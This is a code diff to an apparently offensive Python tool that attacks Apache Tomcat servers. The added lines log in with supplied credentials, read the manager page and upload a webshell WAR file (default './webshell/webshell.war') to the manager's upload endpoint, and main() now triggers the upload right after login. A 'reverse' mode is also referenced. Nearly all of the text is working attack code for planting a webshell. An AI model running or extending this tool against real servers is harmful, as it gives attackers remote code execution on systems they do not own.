@@ -1,4 +1,5 @@
 import argparse
+import base64
 import re
 import sys
 import concurrent.futures
@@ -191,14 +192,24 @@ class authenticated_attack(tomcat):
         }
         print(headers)
         return headers
+
+    def retrieve_data_current_user(self, headers: dict):
+        response = requests.get(f"{self.url}/manager/html", headers=headers)
+        print(response.text)
+
+    def upload(self, payload_path) -> int:
+        headers = self.return_headers()
+        self.retrieve_data_current_user(headers)
+
         if payload_path is None:
             payload_path = './webshell/webshell.war'
 
         with open(payload_path, "rb") as file:
             files = {'file': file}
             auth = (self.username, self.password)
-            response = requests.post(self.url, files=files, auth=auth)
-            return response.text
+            response = requests.post(f"{self.url}/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=",
+                                     files=files, auth=auth)
+            return response.status_code
 
 
 def main():
@@ -267,6 +278,7 @@ def main():
             else:
                 webshell = authenticated_attack(url=args.url, username=args.user, password=args.password)
                 webshell.login(username=args.user, password=args.password)
+                webshell.upload(payload_path=None)
 
         # settings for reverse mode
         case 'reverse':
